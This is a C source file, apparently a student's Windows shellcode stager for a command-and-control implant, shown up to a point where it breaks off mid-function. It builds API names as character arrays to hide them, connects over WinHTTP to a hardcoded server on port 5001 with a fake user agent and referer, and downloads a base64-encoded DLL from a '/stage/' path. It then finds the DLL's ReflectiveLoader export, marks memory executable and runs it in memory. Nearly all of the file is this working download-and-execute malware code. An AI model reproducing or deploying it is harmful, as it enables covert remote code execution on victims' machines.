#include "addresshunter.h"
#include <winnt.h>

typedef ULONG_PTR (WINAPI *REFLECTIVELOADER)();
typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);

// kernel32.dll exports
typedef HMODULE(WINAPI *LOADLIBRARYA)(LPCSTR lpLibFileName);
typedef BOOL(WINAPI *CLOSEHANDLE)(HANDLE);
typedef HANDLE(WINAPI *GETCURRENTPROCESS)();
typedef DWORD(WINAPI *GETLASTERROR)();
typedef LPVOID(WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef DWORD(WINAPI *WAITFORSINGLEOBJECT)(HANDLE hHandle, DWORD dwMilliseconds);
typedef VOID(WINAPI *SLEEP)(DWORD dwMilliseconds);

// advapi32.dll exports
typedef BOOL(WINAPI *OPENPROCESSTOKEN)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI *GETTOKENINFORMATION)(HANDLE, TOKEN_INFORMATION_CLASS,
                                          LPVOID, DWORD, PDWORD);
typedef BOOL(WINAPI *LOOKUPPRIVILEGENAMEW)(LPCWSTR, PLUID, LPWSTR, LPDWORD);

// msvcrt.dll exports
typedef int(WINAPI *WPRINTF)(wchar_t *format, ...);
typedef int(WINAPI *PRINTF)(char *format, ...);
typedef void *(WINAPI *CALLOC)(size_t num, size_t size);
typedef void(WINAPI *FREE)(PVOID memblock);
typedef void *(WINAPI *MALLOC)(size_t);

// user32.dll export
typedef int(WINAPI *MESSAGEBOXW)(HWND, LPWSTR, LPWSTR, UINT32);
typedef int(WINAPI *MESSAGEBOXA)(HWND, LPCTSTR, LPCTSTR, UINT32);

// crypt32.dll export
typedef BOOL(WINAPI *CRYPTSTRINGTOBINARYA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

typedef void* HINTERNET;
typedef UINT64 INTERNET_PORT;

// WinHTTP exports
typedef HINTERNET(WINAPI *WINHTTPOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *WINHTTPCONNECT)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *WINHTTPOPENREQUEST)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD);
typedef BOOL(WINAPI *WINHTTPSENDREQUEST)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *WINHTTPREADDATA)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *WINHTTPRECEIVERESPONSE)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *WINHTTPQUERYDATAAVAILABLE)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI *WINHTTPQUERYHEADERS)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);

// shlwapi.dll (StrToIntW)
typedef DWORD(WINAPI *STRTOINTW)(PCWSTR);

#define WINHTTP_NO_ADDITIONAL_HEADERS NULL
#define WINHTTP_NO_REQUEST_DATA NULL
#define WINHTTP_QUERY_CONTENT_LENGTH 5
#define WINHTTP_HEADER_NAME_BY_INDEX NULL
#define WINHTTP_NO_HEADER_INDEX NULL

typedef struct API_ {
    UINT64 LoadLibraryA;
    UINT64 CloseHandle;
    UINT64 GlobalMemoryStatusEx;
    UINT64 CreateToolhelp32Snapshot;
    UINT64 Process32NextW;
    UINT64 Process32FirstW;
    UINT64 GetComputerNameW;
    UINT64 Sleep;
    UINT64 WinHttpCloseHandle;
    UINT64 WinHttpSetOption;
    UINT64 WinHttpConnect;
    UINT64 WinHttpOpen;
    UINT64 WinHttpOpenRequest;
    UINT64 WinHttpAddRequestHeaders;
    UINT64 WinHttpSendRequest;
    UINT64 WinHttpReceiveResponse;
    UINT64 WinHttpQueryDataAvailable;
    UINT64 WinHttpQueryHeaders;
    UINT64 WinHttpReadData;
    UINT64 GlobalFree;
    UINT64 malloc;
    UINT64 calloc;
    UINT64 free;
    UINT64 memset;
    UINT64 VirtualProtect;
    UINT64 VirtualAlloc;
    UINT64 CreateThread;
    UINT64 WaitForSingleObject;
    UINT64 VirtualFree;
    // Added by me
    UINT64 GetLastError;
    UINT64 MessageBoxA;
    UINT64 MessageBoxW;
    UINT64 wprintf;
    UINT64 printf;
    UINT64 CryptStringToBinaryA;
    UINT64 StrToIntW;
} API, * PAPI;

typedef struct DLL_ {
    LPVOID Buffer;
    DWORD Size;
} DLL, * PDLL;


size_t base64_raw_size(size_t len) {
    size_t padding = 0;

    // Determine padding based on the length of the Base64 string
    if (len > 0) {
        padding = (len % 4 == 0) ? 0 : (4 - (len % 4));
    }

    // Calculate the raw size
    return (len * 3) / 4 - padding;
}

void * myMemcpy (void *dest, const void *src, size_t len)
{
  char *d = dest;
  const char *s = src;
  while (len--)
    *d++ = *s++;
  return dest;
}

void* memset(void* dest, int val, size_t len)
{
    unsigned char* ptr = dest;
    while (len-- > 0)
        *ptr++ = val;
    return dest;
}

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress) {
  WORD wIndex = 0;
  PIMAGE_SECTION_HEADER pSectionHeader = NULL;
  PIMAGE_NT_HEADERS pNtHeaders = NULL;

  pNtHeaders =
      (PIMAGE_NT_HEADERS)(uiBaseAddress +
                          ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

  pSectionHeader =
      (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) +
                              pNtHeaders->FileHeader.SizeOfOptionalHeader);

  if (dwRva < pSectionHeader[0].PointerToRawData)
    return dwRva;

  for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
    if (dwRva >= pSectionHeader[wIndex].VirtualAddress &&
        dwRva < (pSectionHeader[wIndex].VirtualAddress +
                 pSectionHeader[wIndex].SizeOfRawData))
      return (dwRva - pSectionHeader[wIndex].VirtualAddress +
              pSectionHeader[wIndex].PointerToRawData);
  }

  return 0;
}

LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
    WCHAR wVerb[4] = {
      'G', 'E', 'T', 0
    };

    WCHAR wEndpoint[8] = {
      '/', 's', 't', 'a', 'g', 'e', '/', 0
    };

    WCHAR wUserAgent[8] = {
      'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
    };

    WCHAR wVersion[5] = {
      'H', 'T', 'T', 'P', 0
    };

    WCHAR wReferer[19] = {
    'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
    };

    WCHAR wUuid[7] = {
    'a', 'g', 'n', 'n', 't', '1', 0
    };

    /*
    // Home
    WCHAR wServer[13] = {
      '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '0', 0
    };
    */

    // School
    //WCHAR wServer[14] = {'1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0};

    // Host-Only
    WCHAR wServer[12] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};

    WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};

    INTERNET_PORT dwPort = 5001;
    DWORD dwEncodedDllSize;

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)(
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL){
        WCHAR error[] = {'O', 'p', 'e', 'n', 'F', 0};
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(
        hSession,
        wServer,
        dwPort,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL){
        WCHAR error[] = {'C', 'o', 'n', 'n', 'F', 0};
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)(
        hConnect,
        wVerb,
        wEndpoint,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL){
        CHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE) {
        WCHAR error[] = {'S', 'e', 'n', 'd', 'F', '\n', 0};
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE) {
        WCHAR error[] = {'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0};
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;
    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));

        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)( hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpContentLength, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
    }

    if (result)
    {
        dwEncodedDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedDllSize), (size_t)sizeof(WCHAR));
    WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
  
    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0) {
        //printf("Available Bytes: %d\n", availableBytes);
        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)(
            hRequest,
            (LPVOID)(wcEncodedBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );
        // Check for buffer overflow risk
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR)) {
            break;
        }
        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    //((WPRINTF)api->wprintf)(L"dwEncodedDllSize: %d\n", dwEncodedDllSize);
    *pdwDllSize = base64_raw_size(dwEncodedDllSize);
    //((WPRINTF)api->wprintf)(L"pdwDllSize: %d\n", *pdwDllSize);
    LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));

    //DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)((LPVOID)lpEncodedBuffer, dwEncodedDllSize, 0x000000001, lpRawBuffer, &dwEncodedDllSize, NULL, NULL);
    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)(lpEncodedBuffer, dwEncodedDllSize, 0x000000001, lpRawBuffer, pdwDllSize, NULL, NULL);

    ((FREE)api->free)(lpEncodedBuffer);
    ((FREE)api->free)(lpContentLength);

    if (lpRawBuffer != NULL && lengthBuffer)
    { return lpRawBuffer; }
    else
    { return 0;}
}

UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
    WCHAR rlName[] = { 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'L', 'o', 'a', 'd', 'e', 'r', 0 };

    UINT_PTR uiDll = (UINT_PTR)lpDll;
    #ifdef DEBUG
    WCHAR uiDllFormat[] = { 'd', 'l', 'l', 'A', 'd', 'd', 'r', 'e', 's', 's', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(uiDllFormat, uiDll);
    #endif

    UINT_PTR uiNtHeaders;
    UINT_PTR uiExportDirectoryData;
    //UINT_PTR uiExportDirectory;

    uiNtHeaders = uiDll + ((PIMAGE_DOS_HEADER)uiDll)->e_lfanew;
    #ifdef DEBUG
    WCHAR ntHeaders[] = { 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', 's', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(ntHeaders, uiNtHeaders);
    #endif

    uiExportDirectoryData = (UINT_PTR) &((PIMAGE_NT_HEADERS64)uiNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    //ExportDirectoryData = OptionalHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiDll + Rva2Offset(ExportDirectoryData.VirtualAddress, uiDll));
    UINT_PTR uiExportDirectory = uiDll + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->VirtualAddress, uiDll);
    #ifdef DEBUG
    WCHAR pExportDir[] = { 'e', 'x', 'p', 'o', 'r', 't', 'd', 'i', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(pExportDir, uiExportDirectory);
    #endif

    DWORD uiExportDirectorySize = ((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->Size;
    #ifdef DEBUG
    WCHAR pExportDirSize[] = { 'e', 'x', 'p', 'o', 'r', 't', 's', 'i', 'z', 'e', ':', ' ', '%', 'd', '\n', 0 };
    ((WPRINTF)api->wprintf)(pExportDirSize, uiExportDirectorySize);
    #endif

    DWORD dwNumberOfEntries;
    UINT_PTR functionNameAddresses;
    UINT_PTR functionOrdinals;
    UINT_PTR functionAddresses;
    UINT_PTR nameRva;
    UINT_PTR nameAdr;
    UINT_PTR rlAddress;

    /*
    CHAR nameRvaFormat[] = { 'n', 'a', 'm', 'e', 'R', 'v', 'a', ':', '%', 'p', '\n', 0 };
    ((PRINTF)api->printf)(nameRvaFormat, ExportDirectory->Base);
    */

    /*
    nameAdr = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->Name, uiDll);
    WCHAR nameAdrFormat[] = { 'n', 'a', 'm', 'e', 'A', 'd', 'r', ':', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(nameAdrFormat, nameAdr);
    ((PRINTF)api->printf)((CHAR*)(uiDll + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->Name, uiDll)));
    */

    /*
    functionNameAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNames,uiDll);
    CHAR nameAddresses[] = { 'n', 'a', 'm', 'e', 'A', 'd', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((PRINTF)api->printf)(nameAddresses, functionNameAddresses);
    */

    //((PRINTF)api->printf)((CHAR*)functionNameAddresses);


    dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
    #ifdef DEBUG
    CHAR entries[] = { 'e', 'n', 't', 'r', 'i', 'e', 's', ':', ' ', '%', 'd', '\n', 0 };
    ((PRINTF)api->printf)(entries, dwNumberOfEntries);
    #endif

    // NOTE: ExportDirectory->AddressOf... gives an address to an array //
    // but the address is relative to the DLL base which is the address //
    // in the DLL's NT header(?). This address is the preferred address //
    // but is not always the real location the DLL is located in memory //
    // Therefore, the following struct members don't return values that //
    // we can use as is. However, we can calculate their offsets to the //
    // DLL's current location and then add the offsets to DLL's current //
    // address. I *believe* reading the base address from the NT header //
    // and adding the relative virtual address to it would work as well //
    // However, I am not sure if it actually would as I did not test it //
    functionNameAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNames, uiDll);
    functionOrdinals = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNameOrdinals, uiDll);
    functionAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfFunctions, uiDll);

    CHAR* exportedFunctionName = {0};
    while(dwNumberOfEntries--) {
        exportedFunctionName = (CHAR*)(uiDll + Rva2Offset(DEREF(functionNameAddresses), uiDll));
        if (my_strcmp(exportedFunctionName, (CHAR*)rlName) == 0)
        {
            #ifdef DEBUG
            CHAR error1[] = { 'R', 'L', ' ', 'N', 'o', 't', ' ', 'F', 'o', 'u', 'n', 'd', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, error1, error1, 0x0L);
            #endif

            functionNameAddresses += sizeof(DWORD); // 32 bit pointers
            functionOrdinals += sizeof(WORD);       // Ordinal values or 16 bit
            continue;
        }
        else
        {
            #ifdef DEBUG
            CHAR hm[] = { 'F', 'o', 'u', 'n', 'd', ' ', 'R', 'L', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, hm, hm, 0x0L);
            #endif
            // Get the index from the ordinal table, multiply by the size
            // of how big one address in the function address table is.
            // This will give us the number to add to the pointer to
            // `functionAddresses` to get the offset to the RL.
            // Remember, this offset is from the reflective DLL's current
            // address. It will be used to pass to CreateThread as it's
            // fourth parameter (thread s tarting point) //
            functionAddresses += DEREF_16(functionOrdinals) * sizeof(DWORD);
            rlAddress = Rva2Offset(DEREF_32(functionAddresses), uiDll);
            break;
        }
    }

    /*
    while(dwNumberOfEntries--) {
        if (my_strcmp(, (char*)rlName) != 0)
        {
            functionNameAddresses += sizeof(DWORD); // 32 bit pointers
            functionOrdinals += sizeof(WORD);       // Ordinal values or 16 bit
            continue;
        }

        // Get the index from the ordinal table, multiply by the size
        // of how big one address in the function address table is.
        // This will give us the number to add to the pointer to
        // `functionAddresses` to get the offset to the RL.
        // Remember, this offset is from the reflective DLL's current
        // address. It will be used to pass to CreateThread as it's
        // fourth parameter (thread s tarting point) //
        functionAddresses += DEREF_16(functionOrdinals)*sizeof(DWORD);
    }
    */

    return rlAddress;
}

void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    loaderOffset = GetRLOffset(api, lpDll);

    //WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', 'O', 'f', 'f', 's', 'e', 't', ':', ' ', '%', 'p', '\n', 0 };
    //((WPRINTF)api->wprintf)(loader, loaderOffset);
    

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
    #endif


    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);

    DWORD dwOldProtect;
    ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    HANDLE hResult = NULL;

    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 0};
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    //WCHAR test[] = { 't', 'e', 's', 't', 0 };
    //((WPRINTF)api->wprintf)(test);

    if( pDllMain != NULL )
	{
		// call the loaded librarys DllMain to get its HMODULE
		if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hResult) == FALSE)
		{
		    #ifdef DEBUG
            CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0};
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
		    hResult = NULL;
		}
	}
    else
    {
        #ifdef DEBUG
        CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0};
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
	}
}

void messagebox() {
    API Api = { 0 };
    PAPI api = &Api;

    // Library Names
    CHAR user32_c[] = {'u','s','e','r','3','2', '.', 'd', 'l', 'l', 0};
    CHAR winhttp_c[] = {'w','i','n','h','t','t','p', 0};
    CHAR msvcrt_c[] = {'m','s','v','c','r','t', 0};
    CHAR crypt32_c[] = {'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0};
    CHAR shlwapi_c[] = {'s', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0};

    // Library Declarations
    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
 
    // Function Names
    CHAR messageBoxA_c[] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0};
    CHAR messageBoxW_c[] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0};
    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
    CHAR winHttpOpen_c[] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0};
    CHAR winHttpConnect_c[] = {'W','i','n','H','t','t','p','C','o','n','n','e','c','t', 0};
    CHAR winHttpOpenRequest_c[] = {'W','i','n','H','t','t','p','O','p','e','n','R','e','q','u','e','s','t', 0};
    CHAR winHttpSendRequest_c[] = {'W','i','n','H','t','t','p','S','e','n','d','R','e','q','u','e','s','t', 0};
    CHAR winHttpReceiveResponse_c[] = {'W','i','n','H','t','t','p','R','e','c','e','i','v','e','R','e','s','p', 'o', 'n', 's', 'e', 0};
    CHAR WinHttpQueryDataAvailable_c[] = {'W','i','n','H','t','t','p','Q','u','e','r','y','D','a','t','a','A','v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0};
    CHAR winHttpQueryHeaders_c[] = {'W','i','n','H','t','t','p','Q','u','e','r','y','H','e','a','d','e','r', 's', 0};
    CHAR winHttpReadData_c[] = {'W','i','n','H','t','t','p','R','e','a','d','D','a','t','a', 0};
    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0};
    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0};
    CHAR printf_c[] = {'p', 'r', 'i', 'n', 't', 'f', 0};
    CHAR malloc_c[] = {'m', 'a', 'l', 'l', 'o', 'c', 0};
    CHAR calloc_c[] = {'c', 'a', 'l', 'l', 'o', 'c', 0};
    CHAR free_c[] = {'f', 'r', 'e', 'e', 0};
    CHAR virtualProtect_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};
    CHAR virtualAlloc_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0};
    CHAR createThread_c[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
    CHAR waitForSingleObject_c[] = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0};
    CHAR CryptStringToBinaryA_c[] = {'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0};
    CHAR StrToIntW_c[] = {'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0};
    CHAR closeHandle_c[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    CHAR sleep_c[] = {'S', 'l', 'e', 'e', 'p', 0};

    // Get Kernel32
    kernel32dll = GetKernel32();
    // GetLoadLibraryA
    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    // Getting Libraries
    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);

    // WinHTTP
    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);

    // Getting functions
    // User32
    // Msvcrt
    // kernel32
    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);

    // crypt32
    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);

    // shlwapi
    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);

    DWORD dwDllSize;
    LPVOID pRawDll = 0;
    #ifdef DEBUG
    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
    #endif
    while (pRawDll == 0)
    {
        pRawDll = winHTTPClient(api, &dwDllSize);
        ((SLEEP)api->Sleep)(5000);
        if (pRawDll != 0)
        { break; }
